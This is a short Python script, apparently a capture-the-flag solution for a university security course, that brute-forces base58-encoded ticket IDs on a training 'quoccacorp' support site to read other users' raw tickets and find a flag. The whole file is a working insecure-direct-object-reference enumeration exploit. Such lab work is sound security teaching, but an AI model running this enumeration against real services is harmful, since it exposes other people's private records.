import requests
import re
import time
import base58

session = requests.Session()
session.cert = "../../z5437741.pem"

BASE_URL = "https://support.quoccacorp.com"
NEW_TICKET_URL = f"{BASE_URL}/new"

FLAG_PATTERN = r"(COMP6443{.+?})"
def find_flag(text: str, flag_pattern=FLAG_PATTERN):
    if flag_match := re.search(flag_pattern, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def get_char_set():
    char_set = set()
    start_time = time.time()
    while time.time() - start_time < 30:
        response = session.post(NEW_TICKET_URL, data={"title": "test", "content": "test"})
        last_char = response.url[-1]
        char_set.add(last_char)
    return char_set

def generate_endpoint(num1: int, num2: int):
    return base58.b58encode(f"{str(num1)}:{str(num2)}".encode()).decode()

def main():
    # char_set = get_char_set()
    # print(f"{len(char_set) = }")

    num1 = 9400
    num2 = 1
    while True:
        url = BASE_URL + f"/raw/{generate_endpoint(num1, num2)}"
        print(f"🔗 Visiting {num1}:{num2}, {url = }")
        response = session.get(url)
        response_text = response.content.decode("utf-8", "ignore")
        find_flag(response_text)

        if response.status_code == 429:
            continue

        if response.status_code == 404:
            num1 += 1
            num2 = 1
            continue

        num2 += 1

if __name__ == "__main__":
    main()